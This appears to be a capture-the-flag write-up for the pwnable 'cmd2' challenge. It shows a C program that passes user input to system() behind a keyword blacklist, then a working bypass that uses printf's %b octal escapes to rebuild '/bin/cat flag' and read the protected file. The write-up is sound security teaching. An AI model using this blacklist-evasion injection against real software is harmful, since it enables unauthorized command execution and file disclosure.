We are handed the alternate challenge here:
```
int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```
The filter is a little bit more restrictive here, if we look at our solution for cmd1 it was: `./cmd1 '$(printf "/bin/cat %s%s" "fla" "g")'`.
The only thing that isn't going to work anymore is our '/' characters. We have to alter our command a little bit to accommodate,
we can use the `%b` specifier which will expand backslash escape sequences, all we have to do is use the octal value for the forward slash: `\57`.

Using what we know:
```
cmd2@pwnable:~$ ./cmd2 '$(printf "%bbin%bcat %s%s" "\57" "\57" "fla" "g")'
$(printf "%bbin%bcat %s%s" "\57" "\57" "fla" "g")
(Flag Redacted)
```